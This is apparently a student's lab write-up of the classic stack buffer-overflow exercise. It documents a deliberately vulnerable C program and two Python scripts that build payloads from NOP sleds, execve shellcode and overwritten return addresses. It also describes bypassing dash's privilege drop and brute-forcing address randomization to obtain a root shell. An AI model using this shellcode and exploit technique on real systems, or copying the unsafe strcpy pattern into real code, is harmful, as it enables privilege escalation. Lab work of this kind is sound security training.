# Environment Setup
## Turning Off Countermeasures

Address Space Randomization.

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/0789fa4b-b236-46d9-81d3-10e3c676f9be)

Configuring /bin/sh.

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/fdb7e083-ad67-472b-b604-0419472e1c8d)

# TASK-1
## The C version of the Shellcode

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/0bd75615-7150-496b-a3dd-e4e460932f10)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/c238efdd-de60-4132-af5c-8b10265085d3)

## Invoking the shellcode.

![Screenshot 2023-10-28 223127](https://github.com/udayk01/Secure_Coding/assets/52235763/44af9bfd-6b9f-4f69-b5a6-8f3b87fef541)

• By running  the program, it executes the shellcode from the buffer.

• It launches a new command shell (/bin/sh).

• The -z execstack option allows code execution from the stack

# TASK-2
## Understanding the Vulnerable program

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif
int bof(char *str)
{
char buffer[BUF_SIZE];
/* The following statement has a buffer overflow problem */
strcpy(buffer, str);
return 1;
}
int main(int argc, char **argv)
{
char str[517];
FILE *badfile;
badfile = fopen("badfile", "r");
fread(str, sizeof(char), 517, badfile);
bof(str);
printf("Returned Properly\n");
return 1;
}
```
![image](https://github.com/udayk01/Secure_Coding/assets/52235763/11bde6c9-3615-4dae-9a94-8ee211c1808c)

• The program "stack.c" is compiled with stack protection disabled and made executable from the stack.

• The program is executed, but it doesn't receive any input  and exits normally.

• The program permissions are changed to be owned by root and set as Set-UID.

• When the program is executed again, it still doesn't receive any input.

• Can’t exploited the buffer overflow vulnerability in the program, so it currently doesn't perform any unauthorized actions.

# TASK-3

## Launching Attack on 32-bit Program (Level 1)

gdb stack-L1-dbg

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/da44c87f-f678-4e7b-b9ef-420c01c65451)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/b15367df-01e8-4137-914d-37f576db59ef)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/48689fba-fe45-4e93-ab81-3a4941c1def6)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/543fc600-4785-4a2e-b9e3-e21d611b2033)

gedit exploit.py

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/b36e57dd-e731-48cd-a7d1-3d5a84fac931)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/1d832f30-d015-4751-a6ff-b80c9b01d144)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/3227d163-5ac3-4a4d-8b1a-a000d928d06b)

First we have to find  out the difference b/w ebp and buffer using  the debugger .That value was 108 . this offset value we can the difference b/w the return address and the beginning of the buffer ie  108 +4 = 112 (that is where return address). The value of the return address Should help us to jump into nops region b/w the shellcode and the return address.so we fill that space with nops and we will be able to arrive at our shell code.so the return should be a value which is greater than ebp . 

• The goal was to execute "stack-L1" with the "badfile" as input. 

• The buffer overflow vulnerability in "stack-L1" is expected to overwrite the return address with the address of the shellcode in the "badfile." 

• This should lead to the execution of the shellcode, giving you a root shell.

• After running  "stack-L1" with the "badfile" as input, it appears that the exploit was successful.  gained root privileges, as indicated by the "id" command output

# TASK-4

## Launching Attack without Knowing Buffer Size (Level 2)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/c003634b-9f5a-493c-8cc5-4ec7e235bd42)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/4564c373-14d1-463a-b24a-f3fd35bd3255)

Rather than placing the shellcode at the start, we put it at the end of the malicious file and aim to manipulate the return address. We don't know the exact buffer size, which is typically 100-200 bytes, so we use a for loop to scatter multiple return addresses throughout the buffer. This increases the chances of hitting the correct return address, redirecting program execution to a NOP sled or shellcode and exploiting the vulnerability.

# TASK-5

## Launching Attack on 64-bit Program (Level 3)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/ab6b8b14-d700-435d-a73b-32e915b475ff)

```
#!/usr/bin/python3
import sys

# Replace this with the actual shellcode
shellcode = (
    b"\x90\x90\x90\x90" + 
    b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    b"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    b"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
)
#  replace with your shellcode

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

# Put the shellcode somewhere in the payload
start = 100 # Adjust this to the desired position in the payload
content[start:start + len(shellcode)] = shellcode

# Decide the return address value and put it somewhere in the payload
ret = 0x7fffffffd8c0   # Replace with the actual target return address
offset = 216 # Adjust this to the desired offset within the payload
L = 8  # Use 4 for 32-bit address and 8 for 64-bit address

# Convert the return address to bytes and write it to the payload
content[offset:offset + L] = ret.to_bytes(L, byteorder='little')

# Print the payload
sys.stdout.buffer.write(content)
```

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/bb867e06-0724-46ca-8c7a-1ba4e4b24da6)

Here I have put the start  value as 100 and return address rbp.

# TASK-7

## Defeating dash’s Countermeasure

The dash shell in the Ubuntu OS drops privileges when it detects that the effective UID does not equal to the real UID.

We link to dash 

$ sudo ln -sf /bin/dash /bin/sh

Only the setuid version was able to get root acess.

Repeating the level 1 steps, using updated shellcode

```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 400               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcab8 + 200          # Change this number 
offset = 112        # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/9d8eee7e-4a1e-46f9-b771-5576b111b83f)

I am able to get the root access in level 1

# TASK-8

## Defeating Address Randomization

On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base address can have 2^19 = 524; 288 possibilities. This number is not that high and can be exhausted easily with the brute-force approach.

First we set va_space to 2

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/b0dc75ac-b9c8-4867-bf8f-bf21856bf55b)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/bfe3f54d-7bf7-4db5-84be-ab3acc956a14)

Now we run the bruteforce.sh, it runs repeatedly. After 6 minutes 43 sec I finally succeeded to find the address and was able to get the root shell access.

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/436db94c-42a8-482e-a244-9699b5f008a7)

# TASK-9 Experimenting with Other Countermeasures

## a- Turn on the StackGuard Protection

Now compiling the stack.c without the -fno-stack-protector

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/8774d7bd-f584-4500-804b-c7a1a7f94ee7)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/a36c763f-a20a-47ca-9c47-ca506816b716)

Because the stack guard protection was turned on, we got an error.

## b- Turn on the Non-executable Stack Protection

After removing the ‘ -z execstack ’ command from the make file, the make was ran again and a32.out and a64.out was generated. 

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/f6ac88cb-b589-4c3f-9630-580126286cdd)

![image](https://github.com/udayk01/Secure_Coding/assets/52235763/f9c953ab-2324-43d2-99db-ca54d2383bc8)

The -z execstack option is often used when testing buffer overflow exploits, especially if you need to execute shellcode on the stack























